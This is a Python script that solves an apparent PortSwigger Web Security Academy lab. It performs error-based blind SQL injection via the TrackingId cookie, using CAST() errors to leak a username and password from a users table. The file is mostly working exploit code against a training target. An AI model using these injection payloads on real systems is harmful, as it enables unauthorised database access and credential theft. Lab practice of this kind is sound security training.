from bs4 import BeautifulSoup
import requests

# LAB13 Blind SQLi CAST()
# Author: AFANX
# 11/08/2024

def info(msg):
    print("[!] " + str(msg))

def error(msg):
    print("[-] " + str(msg))

def success(msg):
    print("[+] " + str(msg))

def send(payload, cookie=None):
    info(payload)
    if(cookie is None):
        response = requests.get(payload)
        info(response.status_code)
        return response
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(payload, cookies=cookies)
        info(response.status_code)
        return response

def recv_code(url, cookie=None):
    if(cookie is None):
        response = requests.get(url)
        return response.status_code
    else:
        cookies = {}
        cookies[cookie.split(":")[0]] = cookie.split(":")[1]
        response = requests.get(url, cookies=cookies)
        return response.status_code

def recv_cookies(url, domain):
    info(url)
    response = requests.get(url)
    cookie_dict = response.cookies.get_dict(domain=domain)
    found = ['%s=%s' % (name, value) for (name, value) in cookie_dict.items()]
    return ':'.join(found[0].split("="))

def url_encode(str_payload):
    url_encode_result = "+"
    for i in str_payload.split(" "):
        url_encode_result += i + '+'
    return url_encode_result[:len(url_encode_result)-1]

def main():
    url = "https://0a6f008804d9cc76808d67e100700039.web-security-academy.net/"

    cookies = recv_cookies(url, "0a6f008804d9cc76808d67e100700039.web-security-academy.net")
    info("COOKIES: " + cookies)

    # step 0 -> check blind sqli
    payload = cookies + "'--"

    info(cookies)
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")

    for i in soup.find_all('a'):
        if('Home' in i.text):
            success("Good request")
            break
    

    # step 1 -> check CAST()
    payload = cookies + "' AND 1=CAST((SELECT 1 ) as int)--"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")

    for i in soup.find_all('a'):
        if('Home' in i.text):
            success("Good request")
            break
        
    # step 2 -> check and leak user with limit row 1
    cookies = "TrackingId:"
    payload = cookies + "' and 1=cast((select username from users limit 1) as int)--"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")
    
    for i in soup.find_all('h4'):
        if('ERROR' in i.text):
            success("login: " + i.text.split("\"")[1])
            break

    # step 3 -> leak password
    cookies = "TrackingId:"
    payload = cookies + "' and 1=cast((select password from users limit 1) as int)--"
    response = send(url, payload)
    soup = BeautifulSoup(response.text, "html.parser")

    for i in soup.find_all('h4'):
        if('ERROR' in i.text):
            success("password: " + i.text.split("\"")[1])
            break

if __name__ == "__main__":
    main()